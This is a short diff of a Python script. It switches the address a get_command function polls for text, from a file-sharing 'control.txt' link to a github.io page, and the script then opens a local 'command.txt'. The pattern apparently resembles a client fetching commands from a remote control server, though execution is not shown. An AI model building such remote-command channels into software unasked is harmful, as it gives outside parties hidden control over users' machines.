@@ -4,7 +4,7 @@ import time
 
 
 def get_command():
-    a = requests.get('http://ys-n.ysepan.com/618217812/218323838/k665S386KHMNNFckjeqio05/control.txt?lx=xz').text
+    a = requests.get('https://tyuikl32.github.io/index.html').text
     return a
 
 a=open('command.txt', 'a')
